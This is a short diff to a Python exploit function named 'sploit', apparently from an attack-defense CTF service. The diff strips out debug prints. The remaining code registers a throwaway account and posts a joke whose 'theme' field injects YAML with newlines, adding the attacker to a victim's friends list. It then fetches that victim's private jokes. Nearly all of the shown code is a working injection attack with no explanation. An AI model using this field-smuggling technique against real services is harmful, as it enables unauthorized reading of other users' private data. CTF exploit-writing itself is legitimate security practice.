@@ -95,16 +95,12 @@ def sploit():
     token = requests.post(f"{url}/register", data={"username": get_random_string(), "password": "123"}).json()["token"]
     headers = {"Authorization": f"Bearer {token}"}
 
-    resp = requests.get(f"{url}/jokes", data={"username": username, "theme": theme}, headers=headers)
-    print(1, resp.text)
-
     resp = requests.post(f"{url}/jokes", data={"status": "private",
                                                "theme": f"zzzz\nfriends:\n  {username}: yes\nsome:",
                                                "text": "abacaba"}, headers=headers)
-    print(2, resp.text)
 
     resp = requests.get(f"{url}/jokes", data={"username": username, "theme": theme}, headers=headers)
-    print(3, resp.text)
+    print(resp.text)
 
 
 if __name__ == '__main__':
